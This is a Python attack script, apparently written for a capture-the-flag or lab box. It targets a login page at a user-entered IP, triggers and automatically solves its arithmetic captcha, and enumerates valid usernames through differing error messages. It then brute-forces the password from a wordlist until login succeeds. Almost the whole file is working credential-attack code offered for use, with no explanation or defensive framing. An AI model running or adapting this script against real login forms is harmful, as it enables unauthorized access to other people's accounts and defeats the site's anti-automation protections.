import requests

# Enter IP Address here
print('[~] Enter the IP address: ', end = '')
ip = str(input())
url = 'http://' + ip + '/login'

# First requrest to get correct captcha
def first_request(username,password,cap):
	
	# data to send in the post request
	length = len(username)
	data = {
	'username': username,
	'password': password,
	'captcha': cap
	}

	# finding and scrubbing captcha data
	r = requests.post(url,data=data)
	eq = r.text[1839 + length:-393]
	num1 = int(eq[:3])
	num2 = int(eq[6:8])
	opp = eq[4]
	
	# finding out which operator to use for captcha equasion
	if opp == '+':
		cap = num1 + num2
	elif opp == '-':
		cap = num1 - num2
	else:
		cap = num1 * num2
	
	return cap

# Same method as first request
def send_request(username,password,cap):
	
	# First requrest to get correct captcha
	length = len(username)
	data = {
	'username': username,
	'password': password,
	'captcha': cap
	}

	# finding and scrubbing captcha data
	r = requests.post(url,data=data)
	eq = r.text[1839 + length:1847 + length]
	num1 = int(eq[:3])
	num2 = int(eq[6:8])
	opp = eq[4]
	
	# isolate the error code to see if username exists
	error = (str(r.text[1839 + length+ 235:1847 + length + 280]).split('>')[1].replace('\n','').replace('&#39;',''))
	
	# Checks for if username exists, if it does then it returns -1
	if 'Invalid password for user ' in error:
		print('[+] Username ' + username + ' found. Beginning the password cracking')
		return -1
	elif 'Invalid captcha' in error:
		print('[~] Invalid Captcha. Appending to Usernames: ' + username, end='\r')
		users.append(username)
	else:
		print("[-] Does not exist: "+ username+ '                                ', end = '\r')

	# finding out which operator to use for captcha equasion
	if opp == '+':
		cap = num1 + num2
	elif opp == '-':
		cap = num1 - num2
	else:
		cap = num1 * num2
	
	return cap

# Iterates through passwords to find when password authenticates
def last_request(username,password,cap):
	
	# data used for post request
	length = len(password) -1
	data = {
	'username': username,
	'password': password,
	'captcha': cap
	}

	# Data used to find captcha
	r = requests.post(url,data=data)
	eq = r.text[1839 + length:1847 + length]
	
	# if statement that returns when the page is authenticated
	if eq == '':
		print('[+] Password found: ' + password)
		return -1

	num1 = int(eq[:3])
	num2 = int(eq[6:8])
	opp = eq[4]
	
	# error used for authentication
	error = (str(r.text[1839 + length+ 235:1847 + length + 280]).split('>')[1].replace('\n','').replace('&#39;',''))

	# Prints if password worked or if captcha fails
	if 'Invalid password for user ' in error:
		print('[-] Invalid password: ' + password+ '                           ', end = '\r')
		
		
	elif 'Invalid captcha' in error:

		print("[~] Invalid Captcha. Appending password :"+ password, end = '\r')
		passwords.append(password)

	else:
		print('[+] Password found: ' + password)
		return -1;

	# finding out which operator to use for captcha equasion
	if opp == '+':
		cap = num1 + num2
	elif opp == '-':
		cap = num1 - num2
	else:
		cap = num1 * num2
	
	return cap

# loads list of usernames
def load_users():
	users = list()
	with open("usernames.txt") as f:
		for line in f:
			users.append(line.rstrip('\n'))
	print('[+] Loaded ' + str(len(users)) + ' usernames to attempt.')
	return users

# loads list of passwords
def load_passwords():
	passwords = list()
	with open("passwords.txt") as f:
		for line in f:
			passwords.append(line.rstrip('\n'))
	print('[+] Loaded '+ str(len(passwords)) + ' passwords to attempt.')
	return passwords

users = load_users()

# sends 10 requests in order start the captcha
for i in range(10):
	data = {
	'username': 'username',
	'password': 'password'
	}
	r = requests.post(url,data=data)
	print("[+] Sent "+ str(i+1) + "/10 requests to trigger captcha.", end = '\r')

# current captcha code to use
cur = first_request('username', 'password', 0)

# username and password
person = ''
password = ''

# iterates through usernames list
for name in users:
	cur = send_request(name, 'password', cur)
	if cur == -1:
		person = person + name
		break;

passwords = load_passwords()

# iterates through password list
for p in passwords:

	cur = last_request(person, p, cur)
	if cur == -1:
		password = password + p
		break

# final print of username and password
print('[+] Username: ' + person)
print('[+] Password: ' + password)
